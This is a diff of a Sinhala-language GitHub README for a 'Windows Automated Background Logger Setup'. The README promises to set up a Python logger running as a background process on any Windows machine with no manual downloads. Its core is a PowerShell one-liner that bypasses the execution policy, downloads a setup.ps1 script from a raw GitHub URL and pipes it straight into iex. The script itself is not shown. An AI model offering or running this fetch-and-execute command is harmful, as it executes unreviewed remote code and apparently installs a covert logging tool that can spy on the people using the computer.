@@ -2,7 +2,7 @@
 
 පහත දැක්වෙන කෝඩ් බ්ලොක් එකේ දකුණු පස ඇති **Copy** බටන් එක ක්ලික් කර මෙය සම්පූර්ණයෙන්ම පිටපත් කර ඔබගේ GitHub එකෙහි `README.md` ගොනුවට ඇතුළත් කරන්න:
 
-```markdown
+
 # 🚀 Windows Automated Background Logger Setup
 
 මෙම ව්‍යාපෘතිය (Repository) මඟින් ඕනෑම Windows පරිගණකයක ඉතාම පහසුවෙන්, **කිසිදු ගොනුවක් අතින් බාගත කිරීමකින් තොරව (No manual downloads)**, තනි PowerShell කමාන්ඩ් එකක් පමණක් භාවිත කරමින් Python Logger එකක් පසුබිමෙන් (Background Process) ක්‍රියාත්මක වීමට අවශ්‍ය සියලුම සැකසුම් ස්වයංක්‍රීයව සිදු කරයි.
@@ -16,7 +16,7 @@
 ```powershell
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iwr -useb [https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/setup.ps1](https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/setup.ps1) | iex
 
-```
+
 
 ### 💡 මෙම කමාන්ඩ් එක ක්‍රියාත්මක වන ආකාරය:
 
